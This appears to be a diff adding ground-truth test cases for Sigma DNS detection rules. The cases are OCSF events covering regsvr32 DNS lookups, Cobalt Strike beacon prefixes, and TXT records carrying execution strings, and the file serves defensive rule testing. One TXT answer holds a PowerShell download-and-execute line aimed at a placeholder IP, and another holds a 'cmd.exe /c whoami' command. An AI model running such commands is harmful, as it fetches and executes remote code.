+        "expected_match": true,
+        "expected_reason": "_ldap. SRV query from D:\\Temp\\adrecon.exe.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-41-tn-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "_ldap._tcp.dc._msdcs.corp.local"
+          },
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\lsass.exe",
+                "type_id": 1,
+                "name": "lsass.exe"
+              },
+              "uid": "proc-gt-41-tn-1"
+            }
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-41-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Excluded by filter_main_generic (:\\Windows\\).",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-41-tn-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "_ldap._tcp.dc._msdcs.corp.local"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-41-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Boundary: missing Image excluded by filter_main_null (Image: null).",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 42,
+    "rule_id": "36e037c4-c228-4866-b6a3-48eb292b9955",
+    "filename": "dns_query_win_regsvr32_dns_query.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-42-tp-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\regsvr32.exe",
+                "type_id": 1,
+                "name": "regsvr32.exe"
+              },
+              "uid": "proc-gt-42-tp-1"
+            }
+          },
+          "query": {
+            "hostname": "sct.evil.example"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-42-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "System32 regsvr32.exe performing DNS resolution.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-42-tp-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\SysWOW64\\REGSVR32.EXE",
+                "type_id": 1,
+                "name": "REGSVR32.EXE"
+              },
+              "uid": "proc-gt-42-tp-2"
+            }
+          },
+          "query": {
+            "hostname": "stage.evil.example"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-42-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "SysWOW64 REGSVR32.EXE case-insensitive match.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-42-tn-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Windows\\System32\\svchost.exe",
+                "type_id": 1,
+                "name": "svchost.exe"
+              },
+              "uid": "proc-gt-42-tn-1"
+            }
+          },
+          "query": {
+            "hostname": "microsoft.com"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-42-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "svchost.exe DNS query.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      },
+      {
+        "test_event_id": "gt-42-tn-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "actor": {
+            "process": {
+              "file": {
+                "path": "C:\\Temp\\fake_regsvr32.exe",
+                "type_id": 1,
+                "name": "fake_regsvr32.exe"
+              },
+              "uid": "proc-gt-42-tn-2"
+            }
+          },
+          "query": {
+            "hostname": "evil.example"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-42-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Does not end with '\\regsvr32.exe'.",
+        "ocsf_version": "1.4.0",
+        "metadata_profiles": [
+          "host"
+        ]
+      }
+    ]
+  },
+  {
+    "index": 43,
+    "rule_id": "2975af79-28c4-4d2f-a951-9095f229df29",
+    "filename": "net_dns_mal_cobaltstrike.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-43-tp-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "aaa.stage.199283.c2.example.com"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-43-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Starts with default Cobalt Strike DNS beacon prefix 'aaa.stage.'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-43-tp-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "cdn.stage.123456.beacon.net"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-43-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "Contains '.stage.123456.' (selection2).",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-43-tn-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "stage.internal.corp.local"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-43-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Normal internal 'stage.' subdomain.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-43-tn-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "sub.post.1.example.com"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-43-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "'post.1' is not at start of hostname.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  },
+  {
+    "index": 44,
+    "rule_id": "8ae51330-899c-4641-8125-e39f2e07da72",
+    "filename": "net_dns_susp_txt_exec_strings.yml",
+    "cases": [
+      {
+        "test_event_id": "gt-44-tp-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "txt.c2.example",
+            "type": "TXT"
+          },
+          "answers": [
+            {
+              "class": "IN",
+              "type": "TXT",
+              "rdata": "v=spf1 -all"
+            },
+            {
+              "class": "IN",
+              "type": "TXT",
+              "rdata": "IEX (New-Object Net.WebClient).DownloadString('http://1.2.3.4/a')"
+            }
+          ],
+          "src_endpoint": {
+            "uid": "ep-gt-44-tp-1"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "TXT record with 'IEX' in second dns_answer.rdata element.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-44-tp-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "stage.c2.example",
+            "type": "TXT"
+          },
+          "answers": [
+            {
+              "class": "IN",
+              "type": "TXT",
+              "rdata": "cmd.exe /c whoami"
+            }
+          ],
+          "src_endpoint": {
+            "uid": "ep-gt-44-tp-2"
+          }
+        },
+        "expected_match": true,
+        "expected_reason": "TXT record with 'cmd.exe' in dns_answer.rdata.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-44-tn-1",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "txt.c2.example",
+            "type": "A"
+          },
+          "answers": [
+            {
+              "class": "IN",
+              "type": "A",
+              "rdata": "cmd.exe"
+            }
+          ],
+          "src_endpoint": {
+            "uid": "ep-gt-44-tn-1"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "query.type is 'A' rather than 'TXT'.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-44-tn-2",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "example.com",
+            "type": "TXT"
+          },
+          "answers": [
+            {
+              "class": "IN",
+              "type": "TXT",
+              "rdata": "v=spf1 include:_spf.google.com ~all"
+            }
+          ],
+          "src_endpoint": {
+            "uid": "ep-gt-44-tn-2"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Benign SPF TXT record in rdata.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-44-tn-3-sibling-only",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "txt.c2.example",
+            "type": "TXT"
+          },
+          "answers": [
+            {
+              "class": "IEX",
+              "type": "cmd.exe",
+              "flags": [
+                "Invoke-Expression"
+              ],
+              "rdata": "v=spf1 -all"
+            }
+          ],
+          "src_endpoint": {
+            "uid": "ep-gt-44-tn-3-sibling-only"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Target strings ('IEX', 'cmd.exe', 'Invoke-') appear only in sibling attributes (class, type, flags), NOT in rdata.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-44-tn-4-empty-answers",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 6,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "txt.c2.example",
+            "type": "TXT"
+          },
+          "answers": [],
+          "src_endpoint": {
+            "uid": "ep-gt-44-tn-4-empty-answers"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Empty answers array [] must not match.",
+        "ocsf_version": "1.4.0"
+      },
+      {
+        "test_event_id": "gt-44-tn-5-missing-answers",
+        "ocsf_event_class": "DNS Activity (4003)",
+        "category_uid": 4,
+        "class_uid": 4003,
+        "activity_id": 1,
+        "ocsf_fields": {
+          "query": {
+            "hostname": "txt.c2.example",
+            "type": "TXT"
+          },
+          "src_endpoint": {
+            "uid": "ep-gt-44-tn-5-missing-answers"
+          }
+        },
+        "expected_match": false,
+        "expected_reason": "Missing answers field must not match.",
+        "ocsf_version": "1.4.0"
+      }
+    ]
+  }
+]
